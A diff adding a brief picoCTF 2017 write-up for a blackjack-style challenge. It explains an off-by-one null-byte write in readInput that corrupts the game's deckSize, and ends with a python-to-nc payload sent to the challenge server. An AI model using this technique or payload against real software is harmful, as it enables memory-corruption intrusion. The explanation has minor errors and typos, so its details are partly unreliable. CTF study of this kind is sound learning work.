@@ -1,0 +1,51 @@
+typedef struct _deck{
+    size_t deckSize;
+    size_t top;
+    card cards[52];
+} deck;
+
+
+typedef struct _player{
+    int money;
+    deck playerCards;
+} player;
+typedef struct _gameState{
+  int playerMoney;
+  player ctfer;
+  char name[NAMEBUFFLEN];
+  size_t deckSize;
+  player opponent;
+} gameState;
+
+The problem works like this:
+
+The bug here is a standard "error" type in programming.
+//LEN = 32
+unsigned int readInput(char * buff, unsigned int len){
+    size_t count = 0;                                          
+    char c;                                                    
+    while((c = getchar()) != '\n' && c != EOF){
+        if(count < (len-1)){                                
+            buff[count] = c;
+            count++;
+        }
+    }
+    buff[count+1] = '\x00';
+    return count;
+}
+
+Length is a fixed 32
+If count == 31, then length == 31, it will break
+Therefore a 0x00 is written to count[32], a bufferoverrun.
+We can enter \x03 for name.
+
+At the end of the iteration decksize == -1, so the game will not end, regardless of what happens. <- this is important.
+We bet 52 times to exhaust the values wrirten in our original ctfer an opponent deck.
+
+At this point, oppponent deck will overrun and read from heapmemory, which is clean (0x00), while you will start to read from our playerName. 
+^_^ #win
+
+python -c "print '\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03\x03'" | nc shell2017.picoctf.com 4017
+
+\x03*31
+
